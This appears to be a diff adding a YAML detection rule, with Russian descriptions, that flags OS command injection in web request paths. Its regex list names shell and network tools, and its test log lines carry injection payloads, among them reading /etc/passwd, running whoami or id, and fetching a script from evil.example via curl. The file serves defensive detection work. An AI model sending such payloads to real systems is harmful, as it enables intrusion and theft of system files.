@@ -1,0 +1,32 @@
+id: WEB-CMDI-001
+name: Внедрение команд ОС (command injection / webshell)
+description: В запросе найдены команды оболочки после разделителей ; | ` $( или вызовы system()/shell_exec().
+severity: critical
+type: match
+tags: [web, rce, owasp-a03]
+where:
+  type: web
+field: http.path
+transform: [unescape, url_decode, html_decode, compress_space, lowercase]
+patterns:
+  - '[;|`&]\s*(cat|wget|curl|nc|ncat|bash|sh|python3?|perl|nslookup|whoami|uname|id|ls)(\s|$|;|\||`)'
+  - '\$\(\s*(cat|wget|curl|id|whoami|uname|bash|sh|ls)[\s)]'
+  - '`\s*(cat|wget|curl|id|whoami|uname|ls)[\s`]'
+  - '/bin/(ba|z|da)?sh(\s|$|-c|\x27|")'
+  - '\|\s*(ba)?sh(\s|$)'
+  - 'cmd(\.exe)?\s*/c\s|powershell(\.exe)?\s+-'
+  - '(system|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\('
+message: 'Внедрение команд с {src_ip}: {http.path}'
+tests:
+  match:
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /ping?host=127.0.0.1%7Cwhoami HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /x?cmd=$(curl%20http://evil.example/x.sh) HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /cgi-bin/test.cgi?x=%60id%60 HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /index.php?f=system(%27id%27) HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+  no_match:
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /products?category=cat&id=5 HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /api/v1/users?id=5&sort=asc HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /blog/how-to-use-curl HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /search?q=bash+scripting+tips HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.10 - - [12/Oct/2026:10:00:00 +0000] "GET /docs/system-requirements HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
